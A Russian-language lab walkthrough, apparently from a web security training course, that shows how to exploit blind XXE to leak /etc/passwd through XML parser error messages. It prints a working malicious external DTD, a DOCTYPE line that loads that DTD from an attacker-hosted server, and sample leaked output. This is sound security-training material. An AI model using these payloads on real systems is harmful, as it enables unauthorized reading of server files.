Использование слепого XXE для извлечения данных через сообщения об ошибках
Альтернативный подход к эксплуатации слепого XXE заключается в запуске ошибки анализа XML, где сообщение об ошибке содержит конфиденциальные данные, которые вы хотите получить. Это будет эффективно, если приложение вернет результирующее сообщение об ошибке в своем ответе.

Вы можете вызвать сообщение об ошибке анализа XML, содержащее содержимое файла, /etc/passwdиспользуя вредоносный внешний DTD следующим образом:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
Данный DTD выполняет следующие шаги:

Определяет параметрическую сущность XML с именем file, содержащую содержимое файла /etc/passwd.
Определяет параметр XML-сущности, называемую eval, содержащую динамическое объявление другой параметр XML-сущности, называемой error. errorСущность будет оценена путем загрузки несуществующего файла, имя которого содержит значение fileсущности.
Использует сущность, что приводит к выполнению evalдинамического объявления сущности .error
Использует errorсущность, так что ее значение оценивается путем попытки загрузить несуществующий файл, что приводит к сообщению об ошибке, содержащему имя несуществующего файла, которое является содержимым файла /etc/passwd.
Вызов вредоносного внешнего DTD приведет к появлению сообщения об ошибке, подобного следующему:

java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...

---

В этой лабораторной работе есть функция «Проверка запасов», которая анализирует входные данные XML, но не отображает результат.

Для решения лабораторной работы используйте внешний DTD, чтобы вызвать сообщение об ошибке, отображающее содержимое файла /etc/passwd.

Лаборатория содержит ссылку на сервер эксплойтов на другом домене, где вы можете разместить свой вредоносный DTD.

---

1. Нас встречает список продуктов, переходим на любой из них:

![image](https://github.com/user-attachments/assets/420f18e2-6900-4413-81f2-7cc5c6103444)

---

2. Внизу страницы есть кнопка "Проверить наличие на складе" включает Burp прокси и нажимаем:

![image](https://github.com/user-attachments/assets/c12710e3-0520-47a9-b507-1bb41849a7df)

---

3. Поместите полезную нагрузку Burp Collaborator во вредоносный файл DTD:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

![image](https://github.com/user-attachments/assets/11ff29f8-5837-4372-900b-a9d5bbddcdd9)

---

4. Заходим в Proxy -> HTTP History выбираем POST запрос к /product/stock и отправляем в Repeater: 

![image](https://github.com/user-attachments/assets/1a3d72b0-4f86-4a0f-8a3f-d488517695b2)

---

5. Вставьте следующее определение внешней сущности между декларацией XML и stockCheck элементом: <!DOCTYPE foo [<!ENTITY % eyes SYSTEM "YOUR-DTD-URL"> %eyes;]>

![image](https://github.com/user-attachments/assets/0e7f5ee1-ca87-4bf9-ac69-5d11b894fba8)

---

6. Получаем вывод /etc/passwd:

![image](https://github.com/user-attachments/assets/70fb7b7c-fa39-4c23-be4d-b5d2e10d6c9f)
